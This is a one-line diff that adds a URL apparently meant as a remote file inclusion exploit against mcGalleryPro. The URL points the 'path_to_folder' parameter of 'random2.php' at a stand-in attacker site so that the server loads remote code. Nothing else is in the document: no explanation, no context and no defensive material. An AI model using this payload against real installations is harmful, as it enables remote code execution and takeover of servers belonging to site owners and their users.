@@ -1,0 +1,1 @@
+http://www.example.com/path_to_mcgallerypro/random2.php?path_to_folder=http://attacker's site
